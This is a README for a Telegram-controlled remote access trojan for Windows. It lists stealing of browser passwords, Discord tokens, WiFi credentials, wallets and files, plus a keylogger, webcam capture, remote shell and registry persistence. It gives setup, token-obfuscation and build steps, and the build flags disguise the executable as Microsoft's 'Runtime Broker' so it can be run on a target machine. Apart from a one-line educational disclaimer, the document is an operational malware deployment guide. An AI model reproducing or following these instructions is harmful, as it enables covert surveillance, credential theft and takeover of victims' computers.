# Telegram RAT

Full-featured Remote Access Tool with Telegram C2.  
Supports password stealing, Discord tokens, WiFi credentials, keylogger, clipboard monitoring, screenshots, webcam, remote shell, and persistence.

## Features

- System information + geolocation
- Screenshot
- Webcam photo
- Keylogger (on/off/dump)
- Browser password stealer:
  - Chrome
  - Edge
  - Brave
  - Opera / Opera GX
  - Vivaldi
  - Yandex
- Discord tokens
- WiFi passwords
- Clipboard monitor
- File grabber (documents, wallets, keys, RDP, etc.)
- Remote shell
- File download / upload
- MessageBox popup
- Persistence (Registry Run + Startup folder)
- Self-destruct

## Requirements

- Windows 10/11
- Python 3.10+
- Telegram Bot Token
- Admin user ID (numeric)

## Install dependencies

```bash
pip install pyTelegramBotAPI pynput mss opencv-python requests psutil pywin32
pip install nuitka ordered-set zstandard
```

## Setup
1. Create a bot via @BotFather and get the token.
2. Get your numeric ID via @userinfobot.
3. Edit encrypt.py and insert your values:
```bash
TOKEN = "123456:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
ADMIN = "987654321"
```
4. Run the encryptor:
```bash
python encrypt.py
```
5. Copy the output and paste it into rat.py replacing:
```bash
_TOKEN   = "PASTE_HERE"
_ADMIN   = "PASTE_HERE"
_API     = "PASTE_HERE"
_LOGIN   = "PASTE_HERE"
_DISCORD = "PASTE_HERE"
```

## Build

```bash
nuitka ^
  --standalone ^
  --onefile ^
  --windows-disable-console ^
  --windows-company-name="Microsoft Corporation" ^
  --windows-product-name="Runtime Broker" ^
  --windows-file-description="Runtime Broker" ^
  --windows-file-version=10.0.19041.1 ^
  --windows-product-version=10.0.19041.1 ^
  --windows-icon-from-ico=icon.ico ^
  --enable-plugin=anti-bloat ^
  --assume-yes-for-downloads ^
  --remove-output ^
  rat.py
```
Output: rat.exe

## Usage
1. Run rat.exe on the target machine.
2. You will receive an "online" message in Telegram with the capability list and control keyboard.
3. Use the buttons to control the implant.

## Commands
Button,Action

Info,System information

Screen,Screenshot

Cam,Webcam photo

KL ON/OFF,Keylogger

Dump KL,Dump keylogger buffer

Passwords,Steal browser passwords

Discord,Steal Discord tokens

WiFi,Steal WiFi passwords

Clip ON/OFF,Clipboard monitor

Grab,Grab interesting files

Shell,Execute remote command

Download,Download file from target

Upload,Upload file to target

Msg,Show MessageBox

Persist,Add to startup

Kill,Self-destruct

## Notes
- Chromium password stealing requires the user to be logged in (DPAPI).
- Persistence works for the current user only.
- Run as administrator for best results.
- Replace icon.ico with any icon you want.

## Disclaimer

For educational and research purposes only.
